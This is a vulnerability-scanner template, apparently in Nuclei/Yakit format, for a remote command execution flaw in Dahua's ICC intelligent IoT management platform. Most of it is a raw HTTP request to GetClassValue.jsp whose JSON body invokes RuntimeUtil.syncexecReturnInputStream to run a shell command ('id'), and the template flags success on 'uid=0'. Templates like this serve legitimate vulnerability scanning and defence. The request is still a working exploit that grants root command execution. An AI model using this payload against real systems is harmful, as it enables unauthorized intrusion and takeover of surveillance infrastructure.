script_name: 大华ICC智能物联综合管理平台RCE
content:
id: DH_ICC_RCE_Vulnerability

info:
  name: 大华ICC智能物联综合管理平台RCE
  author: Tajang
  severity: high
http:
  - raw:
    - |
      POST /evo-apigw/admin/API/Developer/GetClassValue.jsp HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
      Accept-Encoding: gzip, deflate, br
      Accept-Language: zh-CN,zh;q=0.9
      Connection: close
      Content-Type: application/json
      Content-Length: 222
      
      {
          "data": {
              "clazzName": "com.dahua.admin.util.RuntimeUtil",
              "methodName": "syncexecReturnInputStream",
              "fieldName": ["id"]
          }
      }

    matchers-condition: and
    matchers:
      - type: word
        words:
        - "uid=0"
      - type: status
        status:
        - 200
params: "[{\"Field\":\"target\",\"TypeVerbose\":\"string\",\"FieldVerbose\":\"扫描目标\",\"Help\":\"扫描目标可接受：主机名 / 主机名:端口 / IP段 / URL 等多种格式\",\"Required\":true},{\"Field\":\"reverse-url\",\"TypeVerbose\":\"string\",\"FieldVerbose\":\"反连 URL\",\"Help\":\"可使用 InteractshURL 也可使用 Yakit Reverse URL\"},{\"Field\":\"debug\",\"TypeVerbose\":\"boolean\",\"FieldVerbose\":\"设置调试模式\",\"Help\":\"开启调试模式，调试模式将输出尽量多的调试信息\"},{\"Field\":\"proxy\",\"TypeVerbose\":\"proxy\",\"FieldVerbose\":\"HTTP 代理\",\"Help\":\"设置 HTTP 代理\"}]"
